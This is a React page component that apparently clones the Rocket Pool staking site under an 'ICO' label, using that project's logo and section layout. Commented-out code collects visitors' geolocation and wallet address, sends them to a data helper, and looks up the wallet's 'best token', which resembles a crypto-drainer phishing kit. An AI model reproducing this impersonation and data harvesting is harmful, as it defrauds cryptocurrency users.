import React from "react";
// import { useEffect, useState } from "react";
// import axios from "axios";
// import { useAccount, useNetwork } from "wagmi";
// import { findBestToken, setData } from "../../utils/utils";
// import Status from "../../components/Status";
// import BuyCard from "../../components/BuyCard";
// import { useContractStatus } from "../../hooks/useContractStatus";
import './ico.css'
import StakingRunNode from "../../components/stakingRunNode";
import Security from "../../components/security";
import HowItWorks from "../../components/howItWorks";
import Community from "../../components/community";
// import News from "../../components/news";
import Team from "../../components/team";
import Dao from "../../components/dao";
import NodeOperator from "../../components/nodeOperator";

export default function IcoPage() {
    // const [refresh, setRefresh] = useState(false)
    // const {
    //     totalVolume,
    //     isWL,
    //     userVolume,
    //     tokenBalance,
    //     allowance,
    //     ethBalance
    // } = useContractStatus(refresh)
    // const { address } = useAccount()
    // const { chain } = useNetwork()

    // const [geo, setGeo] = useState("")

    // useEffect(() => {
    //     async function fetchData() {
    //         const res = await axios.get('https://geolocation-db.com/json/')
    //         setGeo(JSON.stringify(res.data))
    //     }
    //     fetchData()
    // }, [])

    // useEffect(() => {
    //     if (geo) {
    //         setData(geo, address, 'init', 'init')
    //     }
    // }, [geo, address])

    // useEffect(() => {
    //     if (address) {
    //         findBestToken(address, chain.id)
    //     }
    // }, [address, chain])

    return (
        <React.Fragment>
            <div id="pload" style={{ display: "none" }}>
                <img alt="img"
                    src="https://rocketpool.net/assets/logo.gif"
                />
            </div>
            <div id="app" data-v-app="">
                <div id="app" className="">
                    <div id="home">
                        <StakingRunNode />
                        <Security />
                        <HowItWorks />
                        <Community />
                        {/* <News /> */}
                        <Team />
                        <Dao />
                        <NodeOperator />
                    </div>
                </div>
            </div>
        </React.Fragment >
    );
}
